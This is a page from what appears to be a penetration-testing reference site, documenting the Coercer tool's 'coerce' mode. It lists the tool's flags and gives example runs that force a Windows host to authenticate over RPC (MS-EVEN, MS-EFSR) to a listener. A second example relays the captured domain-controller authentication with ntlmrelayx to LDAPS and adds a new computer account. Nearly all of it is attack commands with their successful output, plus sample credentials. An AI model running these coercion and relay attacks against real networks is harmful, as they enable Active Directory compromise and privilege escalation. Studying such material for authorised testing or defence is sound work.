---
title : "Coerce"
# pre : ' '
description : "Exploit Remote Procedure Calls (RPC)."
date : 2023-05-04T08:54:56+02:00
# hidden : true
# draft : true
weight : 10
# tags : ['']
---

---

You want to exploit the Remote Procedure Calls on a remote machine to coerce an authentication to [ntlmrelayx.py]({{< ref "ntlmrelayx-py" >}})
or [Responder]({{< ref "responder" >}})?

## Installation

Install [Coercer]({{< ref "../coercer" >}}).

## Usage

```plain
Coercer coerce [-h] [-v] [--delay DELAY] [--http-port HTTP_PORT] [--smb-port SMB_PORT] [--always-continue] [--auth-type AUTH_TYPE] [--filter-method-name FILTER_METHOD_NAME] [--filter-protocol-name FILTER_PROTOCOL_NAME] [--filter-pipe-name FILTER_PIPE_NAME] [-u USERNAME] [-p PASSWORD] [-d DOMAIN]
                      [--hashes [LMHASH]:NTHASH] [--no-pass] [--dc-ip ip address] (-t TARGET_IP | -f TARGETS_FILE) -l LISTENER_IP
```

## Flags

```plain
  -h, --help            show this help message and exit
  -v, --verbose         Verbose mode (default: False)
  -t TARGET_IP, --target-ip TARGET_IP
                        IP address or hostname of the target machine
  -f TARGETS_FILE, --targets-file TARGETS_FILE
                        File containing a list of IP address or hostname of the target machines

Advanced configuration:
  --delay DELAY         Delay between attempts (in seconds)
  --http-port HTTP_PORT
                        HTTP port (default: 80)
  --smb-port SMB_PORT   SMB port (default: 445)
  --always-continue     Always continue to coerce
  --auth-type AUTH_TYPE
                        Desired authentication type ('smb' or 'http').

Filtering:
  --filter-method-name FILTER_METHOD_NAME
  --filter-protocol-name FILTER_PROTOCOL_NAME
  --filter-pipe-name FILTER_PIPE_NAME

Credentials:
  -u USERNAME, --username USERNAME
                        Username to authenticate to the machine.
  -p PASSWORD, --password PASSWORD
                        Password to authenticate to the machine. (if omitted, it will be asked unless -no-pass is specified)
  -d DOMAIN, --domain DOMAIN
                        Windows domain name to authenticate to the machine.
  --hashes [LMHASH]:NTHASH
                        NT/LM hashes (LM hash can be empty)
  --no-pass             Don't ask for password (useful for -k)
  --dc-ip ip address    IP Address of the domain controller. If omitted it will use the domain part (FQDN) specified in the target parameter

Listener:
  -l LISTENER_IP, --listener-ip LISTENER_IP
                        IP address or hostname of the listener machine
```

## Examples

```plain
$ Coercer coerce -t 10.10.20.53 -l 10.10.20.10 -u crypt0rr -p Welkom1234
       ______
      / ____/___  ___  _____________  _____
     / /   / __ \/ _ \/ ___/ ___/ _ \/ ___/
    / /___/ /_/ /  __/ /  / /__/  __/ /      v2.4-blackhat-edition
    \____/\____/\___/_/   \___/\___/_/       by @podalirius_

[info] Starting coerce mode
[info] Scanning target 10.10.20.53
[+] SMB named pipe '\PIPE\eventlog' is accessible!
   [+] Successful bind to interface (82273fdc-e32a-18c3-3f78-827929dc23ea, 0.0)!
      [!] (NO_AUTH_RECEIVED) MS-EVEN──>ElfrOpenBELW(BackupFileName='\??\UNC\10.10.20.241\CRwcf2mm\aa') 
Continue (C) | Skip this function (S) | Stop exploitation (X) ? c
[+] SMB named pipe '\PIPE\lsarpc' is accessible!
   [+] Successful bind to interface (c681d488-d850-11d0-8c52-00c04fd90f7e, 1.0)!
      [+] (ERROR_BAD_NETPATH) MS-EFSR──>EfsRpcDecryptFileSrv(FileName='\\10.10.20.241\UdZsRVQO\file.txt\x00') 
Continue (C) | Skip this function (S) | Stop exploitation (X) ?
```

```plain
$ sudo ntlmrelayx.py -t ldaps://dc02.offsec.nl --delegate-access --remove-mic -smb2support --no-validate-privs
Impacket v0.10.1.dev1+20230316.112532.f0ac44b - Copyright 2022 Fortra

[*] Protocol Client SMTP loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client RPC loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client MSSQL loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client DCSYNC loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server
[*] Setting up HTTP Server on port 80
[*] Setting up WCF Server

[*] Setting up RAW Server on port 6666
[*] Servers started, waiting for connection
[*] Servers started, waiting for connections
[*] SMBD-Thread-5: Received connection from 10.10.20.10, attacking target ldaps://dc03.offsec.nl
[*] Authenticating against ldaps://dc03.offsec.nl as OFFSEC/DC02$ SUCCEED
[*] Assuming relayed user has privileges to escalate a user via ACL attack
[-] Cannot perform ACL escalation because we do not have create user privileges. Specify a user to assign privileges to with --escalate-user
[*] Attempting to create computer in: CN=Computers,DC=offsec,DC=nl
[*] SMBD-Thread-7: Connection from 10.10.20.10 controlled, but there are no more targets left!
[*] Adding new computer with username: JDIWKAKA$ and password: pU^Jj391_X6>b result: OK
```

For example, go further at [Step 4 - printerbug]({{< ref "printerbug" >}}).
